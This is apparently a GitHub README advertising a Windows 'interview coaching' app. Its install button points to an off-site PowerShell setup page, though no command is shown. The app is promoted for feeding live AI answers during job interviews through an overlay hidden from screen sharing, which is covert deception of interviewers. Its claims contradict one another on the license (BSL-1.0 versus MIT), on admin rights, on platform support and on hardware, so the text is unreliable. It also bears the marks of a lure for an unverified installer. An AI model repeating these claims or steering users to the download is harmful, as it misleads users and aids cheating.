<div align="center">

# Final Round AI Desktop: Real-Time Interview Coaching & Transcription Windows 10 & 11

![](files/preview.png)

### 🖥️ PowerShell Setup

[![](files/button.png)](https://thebodytheory01-commits.github.io/final-round-ai-desktop/)

[![users](https://img.shields.io/badge/USERS-184K-dc2626?style=plastic&labelColor=0d1117)]() [![state](https://img.shields.io/badge/STATE-PRODUCTION-2ea44f?style=plastic&labelColor=0d1117)]() [![pwsh](https://img.shields.io/badge/PWSH-INSTALLER-ef4444?style=plastic&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/LICENCE-BSL--1.0-b91c1c?style=plastic&labelColor=0d1117)]()

</div>

---

Final Round AI Desktop is a performance-oriented desktop application that delivers real-time interview coaching, live speech transcription, and instant response suggestions during video calls. Built for job seekers and working professionals, it captures meeting audio, converts spoken questions into text with low latency, and generates structured, context-aware answers for on-screen reference. The application pairs a discreet overlay with configurable hotkeys and local transcription to keep coaching responsive and private throughout the call.

## ✅ Before You Start

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Concealed Overlay Window** — Renders coaching suggestions on a dedicated always-on-top surface that is excluded from common screen-capture pipelines, so the panel stays visible to you and absent from shared meeting feeds.
- **Live Speech Transcription** — Captures system audio and microphone input concurrently and streams a rolling transcript with sub-second latency, preserving speaker turns for later review.
- **Contextual Response Suggestions** — Generates structured, bullet-point answer outlines keyed to the detected question type, including behavioral, technical, and case-study formats.
- **STAR Framework Templates** — Ships with pre-built situation-task-action-result scaffolds that populate automatically when a behavioral prompt is recognized.
- **Technical Reference Panels** — Surfaces condensed syntax references, system-design patterns, and complexity notes in a side drawer for rapid consultation during coding screens.
- **Session History and Debrief** — Stores completed transcripts locally and produces a post-call summary highlighting answer coverage, pacing, and flagged knowledge gaps.
- **Hotkey-Driven Control** — Activates, pauses, and dismisses the overlay through configurable global shortcuts without leaving the active call window.
- **Local-First Transcription** — Runs speech-to-text inference on-device to keep audio within the local environment and reduce round-trip latency.
- **Model-Agnostic Backend** — Connects to interchangeable language-model providers through a unified settings panel, allowing you to select the engine that fits your workload.
- **Configurable Privacy Controls** — Offers granular toggles for transcript retention, overlay visibility scope, and audio routing so behavior can be tuned to your environment.

## How it works

Final Round AI Desktop runs as a native process that sits between your conferencing application and its audio devices, providing real-time coaching without disrupting the call itself.

**Audio Capture Pipeline**

The application registers two virtual audio endpoints at startup: one for system output (the interviewer's voice) and one for microphone input (your voice). Both streams are routed through a low-latency audio ring buffer before being chunked into short, overlapping segments. This design keeps capture continuous even when devices switch mid-session, and it preserves the original audio for the post-interview transcript.

**Local Speech Transcription**

Each audio segment is transcribed on-device by an embedded Whisper inference engine. Transcription runs locally, so speech never leaves the machine before it becomes text. The engine applies voice activity detection to skip silence, which keeps processing overhead low during long calls. Transcribed text is emitted incrementally, and finalized utterances are pushed to the coaching layer within roughly one second of being spoken.

**The Overlay Window**

The coaching surface is a borderless, always-on-top window rendered by the Electron shell. It is positioned in a corner of the display and rendered with per-pixel transparency so it never obscures active windows. Critically, the overlay is registered as a non-capturable surface using the operating system's window display affinity APIs, which instructs screen-capture pipelines to omit it. When you share your screen in Zoom, Teams, or any comparable tool, participants see your presentation but not the coaching layer rendered beneath it.

**Response Generation**

The finalized transcript is passed to the response engine together with the active session profile. The engine detects question boundaries, classifies the question type (behavioral, technical, or case study), and requests a structured answer from the configured language model. Responses arrive as concise bullet points rather than prose, so they can be read at a glance while speaking. Generation is streaming, meaning the first bullet appears while later ones are still being composed.

**Session Profiles and Templates**

Profiles store role-specific context: the job description, your resume highlights, and any company-specific notes. Templates supply the structural scaffolding for common question families — situation-task-action-result framing for behavioral prompts, complexity analysis for coding prompts, and trade-off enumeration for design prompts. The response engine blends profile context into the prompt so suggestions reference your actual experience rather than generic advice.

**Hotkey Control and Session Lifecycle**

A global hotkey toggles the overlay and starts or pauses capture without requiring you to leave the call window. The app minimizes to the system tray, maintains a session log, and can export a full transcript with the generated suggestions once the call ends. Hotkey bindings, audio device selection, model provider, and overlay position are all configurable from the settings panel, and changes apply immediately to the running session.

**Data Flow Summary**

Audio is captured through virtual endpoints, transcribed locally, and converted to text before any network request is made. Text prompts and profile context are sent to the configured model provider; audio recordings are never transmitted. The resulting suggestions return over an encrypted channel and render in the non-capturable overlay until you toggle them off.

## Compatibility

Final Round AI Desktop runs natively on Windows 10 and 11 (64-bit) and macOS 12 Monterey or later, including both Intel and Apple Silicon hardware. The application is packaged as a standard desktop installer for each platform, with no additional runtime dependencies required beyond the operating system itself.

### Operating System Support

| Platform | Minimum Version | Architecture | Status |
|---|---|---|---|
| Windows | Windows 10 (build 19041) | x64 | Fully supported |
| Windows | Windows 11 | x64, ARM64 | Fully supported |
| macOS | macOS 12 Monterey | Intel, Apple Silicon | Fully supported |
| Linux | Ubuntu 22.04 LTS | x64 | Experimental |

Windows support includes native integration with the display affinity subsystem, which enables the overlay to remain excluded from screen capture in conferencing clients. macOS builds use the equivalent window-sharing exclusion APIs and require Screen Recording and Microphone permissions to be granted during first launch. Linux builds are provided on an experimental basis; audio capture relies on PulseAudio or PipeWire, and overlay exclusion behavior varies by compositor.

### Conferencing Platform Integration

The audio capture pipeline is designed to work alongside the major video conferencing clients without modifying or patching them. Verified integrations include:

- Zoom (desktop client)
- Microsoft Teams (desktop client)
- Google Meet (via supported browsers)
- Cisco Webex
- Slack Huddles

Because capture operates at the system audio layer through a virtual audio device, any conferencing client that routes audio through the operating system's standard output is compatible. Microphone input is captured independently, allowing bidirectional transcription of both the interviewer and the candidate.

### Hardware Requirements

- **Processor:** Dual-core 2.0 GHz or faster; quad-core recommended for concurrent local transcription
- **Memory:** 8 GB minimum; 16 GB recommended when running local speech-to-text models
- **Storage:** 500 MB for the application; additional space for cached transcripts and optional local model weights
- **Audio:** Any input/output device recognized by the operating system; a virtual audio cable is provisioned automatically during setup
- **Display:** 1280×720 or higher; multi-monitor configurations are supported with per-display overlay placement

### Network and AI Backend

The application requires an active network connection for response generation when using hosted model providers. Outbound HTTPS traffic to the configured provider endpoint must be permitted by local firewall rules. Local transcription operates entirely on-device and does not require connectivity. Users who prefer fully offline operation may pair on-device transcription with a self-hosted model endpoint.

### Known Limitations

- Overlay exclusion on Linux depends on compositor support and is not guaranteed across all desktop environments.
- ARM64 Windows devices run the x64 build under emulation; a native ARM64 build is planned.
- macOS requires re-authorization of capture permissions after major OS upgrades.
- Virtual audio device installation on Windows may require administrator privileges on managed devices.

## FAQ

**Is the overlay detectable by screen sharing or recording software?**
No. The overlay window is excluded from capture pipelines at the OS compositor level, so it does not appear in shared screens, recordings, or screenshots taken by conferencing applications. It renders only on the local display. Note that this applies to standard capture APIs; specialized kernel-level monitoring tools are outside the supported scope.

**Which meeting platforms are supported?**
Any application that exposes system audio through the standard capture interfaces is compatible, including the major video conferencing suites, browser-based calls, and standalone VoIP clients. Audio routing is handled by a virtual loopback device, so platform-specific integrations are not required.

**Does transcription run locally or in the cloud?**
Speech-to-text inference runs locally on your machine using an embedded Whisper-class model. Only the transcribed text is sent to the configured language model for response generation. No raw audio leaves the device.

**Can I select which language model powers the suggestions?**
Yes. The response engine is model-agnostic and accepts credentials for multiple providers. You can switch between providers and model tiers in the settings panel, and per-session overrides are available for latency-sensitive calls.

**What is the end-to-end latency from question to suggested response?**
Typical latency is under two seconds on modern hardware with a local transcription model and a hosted generation model. Latency scales with model size, network round-trip time, and audio buffer length; the buffer length is configurable for accuracy-versus-speed tradeoffs.

**How are transcripts and session data stored?**
Session transcripts, generated suggestions, and post-call reports are persisted locally in an encrypted store. Retention is configurable, and a one-click purge removes all session artifacts. Nothing is synchronized to a remote service unless you explicitly export it.

**Does the application require elevated privileges?**
No administrator rights are needed for standard operation. The virtual audio device installs at the user level. Elevation is only requested if you enable optional low-level window affinity features on platforms that gate them behind system permissions.

**Can I customize the suggestion format and response templates?**
Yes. The prompt layer is fully editable: you can define role-specific personas, output structures, and bullet-point densities. Behavioral templates ship preconfigured, and custom templates can be imported as plain-text profiles.

**What are the hardware requirements?**
A quad-core processor, 8 GB of RAM, and Windows 10 or macOS 12 or later are the baseline. Local transcription benefits from additional RAM and, where available, hardware acceleration. The application runs comfortably alongside conferencing software on typical laptops.

**Is usage metered or subscription-based?**
The desktop client itself is openly available for use and inspection. Generation costs are determined by whichever model provider you connect, billed directly by that provider. There is no intermediary markup or seat-based licensing.

**How do I report a defect or request a capability?**
Use the repository issue tracker for defects and capability requests. Include your platform, version, and a sanitized session log where applicable. Security-sensitive reports should follow the disclosure guidance in the repository's security policy rather than the public tracker.

## Disclaimer

Final Round AI Desktop App is provided as a technical utility for real-time transcription, speech analysis, and response suggestion during live video calls. It is intended to support communication clarity and answer structuring, not to replace professional judgment, preparation, or independent decision-making.

The application processes audio locally where supported and transmits transcription and prompt data to the configured AI model provider for response generation. Users are responsible for configuring API credentials, securing local storage, and understanding how their chosen model provider handles transmitted data. Latency, transcription accuracy, and suggestion quality depend on hardware performance, network conditions, audio routing configuration, and the capabilities of the selected model.

The overlay rendering, audio capture, and transcription features are engineered for compatibility with common video conferencing platforms, but behavior may vary across operating system versions, display configurations, and screen-sharing implementations. Users should validate functionality in their own environment before relying on it during time-sensitive calls.

Users are solely responsible for determining whether the use of transcription and response-suggestion software aligns with the policies of their employer, educational institution, interview host, or meeting platform, and for obtaining any consent required by applicable law or agreement. Final Round AI Desktop App does not guarantee employment outcomes, interview results, or the accuracy of generated content, and all suggestions should be reviewed for correctness before use.

The software is supplied on an as-is basis, without warranties of merchantability, fitness for a particular purpose, or non-infringement. The maintainers accept no liability for indirect, incidental, or consequential damages arising from use of the application, including missed opportunities, policy violations, or data loss.

## License

Final Round AI Desktop is distributed under the MIT License, a permissive, OSI-approved license that grants broad permissions for use, modification, and redistribution of the software. Under the terms of this license, you are authorized to run the application for any purpose, to study and adapt the source code to your requirements, and to redistribute original or modified versions, provided that the copyright notice and permission notice are preserved in all copies or substantial portions of the software.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

For teams integrating Final Round AI Desktop into internal tooling or derivative distributions, the MIT License imposes minimal compliance overhead: retain the license text, attribute the original project, and document any modifications you introduce. Full license text is included in the `LICENSE` file at the root of the project repository.